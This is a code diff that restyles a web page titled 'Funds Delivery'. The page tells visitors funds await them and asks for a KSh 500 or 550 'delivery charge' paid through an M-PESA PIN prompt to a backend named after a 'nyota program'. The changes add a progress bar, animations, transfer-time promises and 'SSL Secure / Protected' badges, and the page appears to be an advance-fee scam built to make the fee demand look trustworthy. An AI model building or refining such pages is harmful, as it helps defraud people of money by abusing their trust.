@@ -20,60 +20,159 @@ body{
     justify-content:center;
     align-items:center;
     padding:20px;
+    overflow-x:hidden;
     background:
-        radial-gradient(circle at 10% 10%, rgba(34,197,94,.35), transparent 28%),
-        radial-gradient(circle at 90% 90%, rgba(59,130,246,.35), transparent 28%),
+        radial-gradient(circle at 15% 20%, rgba(34,197,94,.35), transparent 30%),
+        radial-gradient(circle at 85% 80%, rgba(59,130,246,.35), transparent 30%),
         linear-gradient(135deg,#064e3b,#1e40af);
-    color:#fff;
+    color:white;
+}
+
+body::before,
+body::after{
+    content:"";
+    position:fixed;
+    width:240px;
+    height:240px;
+    border-radius:50%;
+    filter:blur(90px);
+    z-index:-1;
+    animation:moveBlob 10s ease-in-out infinite alternate;
+}
+
+body::before{
+    background:#16a34a;
+    top:-70px;
+    left:-70px;
+}
+
+body::after{
+    background:#2563eb;
+    bottom:-70px;
+    right:-70px;
+}
+
+@keyframes moveBlob{
+    from{transform:translate(0,0);}
+    to{transform:translate(20px,-20px);}
 }
 
 .container{
     width:100%;
-    max-width:460px;
+    max-width:470px;
 }
 
 .card{
     background:rgba(255,255,255,.10);
-    backdrop-filter:blur(15px);
+    backdrop-filter:blur(16px);
     border:1px solid rgba(255,255,255,.15);
-    border-radius:22px;
+    border-radius:24px;
     padding:24px;
-    box-shadow:0 20px 60px rgba(0,0,0,.35);
+    box-shadow:0 25px 70px rgba(0,0,0,.35);
+}
+
+/* Progress */
+
+.progress{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    margin-bottom:22px;
+}
+
+.step{
+    width:34px;
+    height:34px;
+    border-radius:50%;
+    background:rgba(255,255,255,.15);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-weight:bold;
+}
+
+.step.active{
+    background:#16a34a;
+}
+
+.line{
+    width:55px;
+    height:3px;
+    background:rgba(255,255,255,.2);
+}
+
+.line.active{
+    background:#16a34a;
+}
+
+/* Heading */
+
+.hero{
+    text-align:center;
+    font-size:55px;
+    margin-bottom:10px;
+    animation:float 3s ease-in-out infinite;
+}
+
+@keyframes float{
+    0%,100%{transform:translateY(0);}
+    50%{transform:translateY(-8px);}
 }
 
 h1{
     text-align:center;
-    margin-bottom:10px;
-    font-size:26px;
+    font-size:28px;
+    margin-bottom:8px;
 }
 
 .subtitle{
     text-align:center;
-    color:rgba(255,255,255,.78);
-    margin-bottom:24px;
+    color:rgba(255,255,255,.8);
     line-height:1.5;
+    margin-bottom:22px;
 }
 
+/* Cards */
+
 .delivery-option{
+    position:relative;
     display:flex;
     gap:12px;
     align-items:flex-start;
-    padding:16px;
-    border-radius:14px;
+    padding:18px;
+    border-radius:16px;
     border:2px solid rgba(255,255,255,.12);
     background:rgba(255,255,255,.05);
-    margin-bottom:14px;
+    margin-bottom:15px;
     cursor:pointer;
-    transition:.2s;
+    transition:.3s ease;
 }
 
 .delivery-option:hover{
-    border-color:#16a34a;
+    transform:translateY(-2px);
 }
 
 .delivery-option input{
-    margin-top:4px;
-    accent-color:#16a34a;
+    margin-top:5px;
+    accent-color:#22c55e;
+}
+
+.delivery-option:has(input:checked){
+    border-color:#22c55e;
+    background:rgba(34,197,94,.18);
+    box-shadow:0 12px 28px rgba(34,197,94,.25);
+}
+
+.check{
+    position:absolute;
+    right:16px;
+    top:16px;
+    display:none;
+    font-weight:bold;
+}
+
+.delivery-option:has(input:checked) .check{
+    display:block;
 }
 
 .method{
@@ -82,58 +181,127 @@ h1{
 }
 
 .fee{
-    margin-top:5px;
-    color:rgba(255,255,255,.72);
+    margin-top:6px;
+    color:rgba(255,255,255,.75);
     font-size:14px;
 }
 
-.selected-fee{
-    margin:20px 0;
-    padding:16px;
-    border-radius:12px;
-    background:rgba(22,163,74,.12);
-    border:1px solid rgba(22,163,74,.25);
-    text-align:center;
-    font-size:18px;
+.fee small{
+    color:rgba(255,255,255,.55);
 }
+
+/* Amount */
+
+.selected-fee{
+    margin:22px 0;
+    padding:18px;
+    border-radius:14px;
+    background:rgba(22,163,74,.12);
+    border:1px solid rgba(22,163,74,.3);
+    text-align:center;
+}
+
+.selected-fee strong{
+    display:inline-block;
+    font-size:24px;
+    transition:.25s;
+}
+
+.changed{
+    transform:scale(1.15);
+}
+
+/* Button */
 
 button{
     width:100%;
-    padding:16px;
+    padding:17px;
     border:none;
-    border-radius:12px;
+    border-radius:14px;
     background:linear-gradient(135deg,#16a34a,#087f32);
-    color:#fff;
+    color:white;
     font-size:17px;
     font-weight:bold;
     cursor:pointer;
+    position:relative;
+    overflow:hidden;
 }
 
-button:hover{
-    background:linear-gradient(135deg,#1db954,#0b7a2f);
+button::after{
+    content:"";
+    position:absolute;
+    top:0;
+    left:-120%;
+    width:100%;
+    height:100%;
+    background:linear-gradient(120deg,
+        transparent,
+        rgba(255,255,255,.35),
+        transparent);
+    transition:.7s;
+}
+
+button:hover::after{
+    left:120%;
 }
 
 button:disabled{
-    opacity:.6;
+    opacity:.7;
     cursor:not-allowed;
 }
 
-#status{
-    min-height:24px;
-    margin-top:18px;
-    text-align:center;
-    font-size:14px;
-    line-height:1.5;
+/* Spinner */
+
+.spinner{
+    display:none;
+    width:24px;
+    height:24px;
+    border:3px solid rgba(255,255,255,.25);
+    border-top:3px solid white;
+    border-radius:50%;
+    animation:spin .8s linear infinite;
+    margin:14px auto;
 }
 
-.success{color:#7ef0aa;}
-.error{color:#ff8d96;}
+@keyframes spin{
+    to{transform:rotate(360deg);}
+}
+
+/* Status */
+
+#status{
+    min-height:24px;
+    margin-top:14px;
+    text-align:center;
+    padding:12px;
+    border-radius:10px;
+}
+
+.success{
+    background:rgba(34,197,94,.18);
+    color:#7ef0aa;
+}
+
+.error{
+    background:rgba(239,68,68,.18);
+    color:#ffb4b4;
+}
+
+/* Trust */
+
+.trust{
+    display:flex;
+    justify-content:space-between;
+    margin-top:20px;
+    font-size:12px;
+    color:rgba(255,255,255,.75);
+}
 
 .footer{
     text-align:center;
     margin-top:18px;
-    font-size:12px;
     color:rgba(255,255,255,.55);
+    font-size:12px;
 }
 </style>
 </head>
@@ -144,38 +312,63 @@ button:disabled{
 
 <div class="card">
 
+<div class="progress">
+<div class="step active">1</div>
+<div class="line active"></div>
+<div class="step active">2</div>
+<div class="line"></div>
+<div class="step">3</div>
+</div>
+
+<div class="hero">📲</div>
+
 <h1>Funds Delivery</h1>
 
 <p class="subtitle">
-
-            Kindly choose where you would like your funds transferred.
-            Each delivery method has a small fee to cover applicable
-            network and processing charges
+Kindly choose where you would like your funds transferred. Each delivery method has a small fee to cover applicable PROCESSING and DELIVERY charges.
 </p>
 
 <label class="delivery-option">
 <input type="radio" name="delivery" value="500">
 <div>
 <div class="method">📱 Mobile Money</div>
-<div class="fee">Delivery charge: KSh 500</div>
+<div class="fee">
+KSh 500 delivery charge
+<br><small>Funds arrive in 1–5 minutes</small>
 </div>
+</div>
+<div class="check">✓</div>
 </label>
 
 <label class="delivery-option">
 <input type="radio" name="delivery" value="550">
 <div>
 <div class="method">🏦 Bank Account</div>
-<div class="fee">Delivery charge: KSh 550</div>
+<div class="fee">
+KSh 550 delivery charge
+<br><small>Within one business day</small>
 </div>
+</div>
+<div class="check">✓</div>
 </label>
 
 <div class="selected-fee">
-Delivery Fee: <strong>KSh <span id="deliveryFee">0</span></strong>
+Delivery Fee
+
+**KSh <span id="deliveryFee">0</span>**
 </div>
 
-<button id="payButton">Pay Delivery Charges</button>
+<button id="payButton">Pay Delivery Charges →</button>
+
+<div class="spinner" id="spinner"></div>
 
 <div id="status"></div>
+
+<div class="trust">
+<span>🔒 SSL Secure</span>
+<span>⚡ M-PESA</span>
+<span>✔ Protected</span>
+</div>
 
 </div>
 
@@ -193,10 +386,13 @@ const BACKEND_URL="https://nyota-program-backend.onrender.com";
 const deliveryFee=document.getElementById("deliveryFee");
 const payButton=document.getElementById("payButton");
 const statusElement=document.getElementById("status");
+const spinner=document.getElementById("spinner");
 
 document.querySelectorAll('input[name="delivery"]').forEach(input=>{
     input.addEventListener("change",()=>{
         deliveryFee.textContent=Number(input.value).toLocaleString("en-KE");
+        deliveryFee.parentElement.classList.add("changed");
+        setTimeout(()=>deliveryFee.parentElement.classList.remove("changed"),250);
     });
 });
 
@@ -207,7 +403,8 @@ function setStatus(message,type=""){
 
 function setLoading(loading,text="Processing..."){
     payButton.disabled=loading;
-    payButton.textContent=loading?text:"Pay Delivery Charges";
+    payButton.textContent=loading?text:"Pay Delivery Charges →";
+    spinner.style.display=loading?"block":"none";
 }
 
 async function readJson(response){
@@ -268,7 +465,7 @@ async function payDelivery(){
             data.data?.transactionId||
             data.data?.checkout_request_id;
 
-        setLoading(true,"Waiting for payment...");
+        setLoading(true,"Waiting for Payment...");
         setStatus("M-PESA prompt sent. Enter your PIN.");
 
         await checkPayment(transactionId);
@@ -332,7 +529,7 @@ async function checkPayment(transactionId){
     }
 
     setStatus(
-        "We could not confirm the payment in time. Check your M-PESA messages.",
+        "We could not confirm payment in time. Check your M-PESA messages.",
         "error"
     );
 
@@ -343,4 +540,4 @@ payButton.addEventListener("click",payDelivery);
 </script>
 
 </body>
-</htm
+</html>
